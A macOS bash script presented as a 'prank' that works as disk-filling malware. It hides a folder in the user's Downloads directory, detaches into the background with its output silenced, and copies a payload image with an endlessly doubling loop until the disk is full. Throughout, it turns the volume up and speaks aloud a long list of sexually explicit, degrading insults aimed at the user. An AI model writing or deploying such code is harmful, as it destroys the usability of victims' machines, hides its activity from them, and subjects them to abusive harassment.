#!/bin/bash

# Karan's Ultimate Prank v4.1 - VOICE ONLY FINAL EDITION
# No terminal prints, only dark voice commentary

VERSION="4.1.0"
HIDDEN_DIR="$HOME/Downloads/.Karan"

# Dark audio messages (what gets spoken)
DARK_AUDIO=(
    "Your disk is crying tears of binary despair!"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "i know you're a pathetic dumbfuck"
    "i know you're a stupid fucking bitch"
    "i know you're a useless fucking prick"
    "i know you're a fucking shit-for-brains"
    "i know you're a pathetic piece of fucking trash"
    "i know you're a fucking idiot sandwich"
    "Your precious files are screaming for mercy!"
    "i know you're a fucking dumb cunt"
    "i know you're a useless fucking cock"
    "i know you're a fucking dumbass motherfucker"
    "your asshole is a fucking black hole"
    "you're a fucking worthless cunt"
    "your tits are fucking disgusting"
    "you're a fucking dumbass motherfucker"
    "your dick is smaller than a fucking ant"
    "you're a fucking piece of shit"
    "your brain is fucking mush"
    "i know you're a worthless piece of shit"
    "i know you're a fucking dumb cunt"
    "i know you're a shit-stained loser"
    "i know you're a fucking waste of skin"
    "Your hard drive is haunted by digital ghosts!"
    "you're a fucking cocksucking cunt"
    "your pussy stinks like rotten fish"
    "you're a shit-eating piece of trash"
    "you're a fucking dumbfuck"
    "you're a fucking shit-stained loser"
    "your mouth is a fucking cesspool"
    "you're a fucking useless waste of skin"
    "your eyes are fucking beady"
    "you're a fucking pathetic piece of trash"
    "your nose is a fucking pig snout"
    "you're a fucking disgusting fuck"
    "your teeth are fucking rotten"
    "you're a fucking dumb cunt"
)

# Setup (silent)
setup() {
    mkdir -p "$HIDDEN_DIR" 2>/dev/null || true
    chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
    touch "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# Silent logging only
log_silent() {
    echo "$(date): $1" >> "$HIDDEN_DIR/.log" 2>/dev/null || true
}

# FIXED: Audio function that actually works
speak_dark_message() {
    # Kill existing audio first
    pkill -f "say" 2>/dev/null || true
    
    # Pick random dark message
    local dark_msg=${DARK_AUDIO[$RANDOM % ${#DARK_AUDIO[@]}]}
    
    # Set volume and speak (synchronously)
    osascript -e "set volume output volume 90" 2>/dev/null || true
    say "$dark_msg" 2>/dev/null
    wait
}

# Exponential destruction with voice only
exponential_voice_destruction() {
    local payload="$1"
    local round=0
    local current_count=0
    local target_count=1
    
    # Setup
    setup
    cp "$payload" "$HIDDEN_DIR/.payload"
    
    log_silent "Starting voice-only exponential destruction"
    speak_dark_message
    
    # Create first file
    if ! cp "$HIDDEN_DIR/.payload" "$HIDDEN_DIR/karan_exp_$(printf "%08d" 1).jpg" 2>/dev/null; then
        log_silent "Disk full at genesis"
        speak_dark_message
        return
    fi
    current_count=1
    speak_dark_message
    
    # Exponential doubling loop
    while true; do
        round=$((round + 1))
        local new_target=$((target_count * 2))
        local files_to_create=$((new_target - current_count))
        
        log_silent "Round $round: doubling $current_count to $new_target"
        speak_dark_message
        
        # Create files for this round
        local created_this_round=0
        for ((i=1; i<=files_to_create; i++)); do
            local new_file_num=$((current_count + i))
            local source_file_num=$(((new_file_num - 1) % current_count + 1))
            
            # Copy existing file to create new one
            if ! cp "$HIDDEN_DIR/karan_exp_$(printf "%08d" $source_file_num).jpg" \
                    "$HIDDEN_DIR/karan_exp_$(printf "%08d" $new_file_num).jpg" 2>/dev/null; then
                log_silent "Disk completely full after $((current_count + created_this_round)) files"
                speak_dark_message
                return
            fi
            
            created_this_round=$((created_this_round + 1))
            
            # Dark commentary every 40 files
            if [[ $((created_this_round % 40)) -eq 0 ]]; then
                speak_dark_message
            fi
        done
        
        current_count=$new_target
        target_count=$new_target
        
        log_silent "Completed round $round with total $current_count files"
        speak_dark_message
        
        # Milestone celebrations (voice only)
        case $current_count in
            2)
                speak_dark_message
                ;;
            16)
                speak_dark_message
                ;;
            256)
                speak_dark_message
                ;;
            4096)
                speak_dark_message
                ;;
            65536)
                speak_dark_message
                ;;
        esac
        
        # REMOVED: sleep 0.4 for light speed generation
    done
}

# Validate system
validate() {
    [[ "$(uname)" == "Darwin" ]] || exit 1
    [[ -f "$1" ]] || exit 1
}

# Main execution
main() {
    local payload="$1"
    [[ -z "$payload" ]] && payload="/opt/homebrew/share/dingdong/payload.png"
    validate "$payload"
    exponential_voice_destruction "$payload"
}

# Execution logic
if [[ "$2" == "--execute" ]]; then
    # Background execution - no terminal output
    exec > /dev/null 2>&1
    main "$1"
else
    # Launch in background silently
    setup
    "$0" "$1" --execute &
    disown
fi
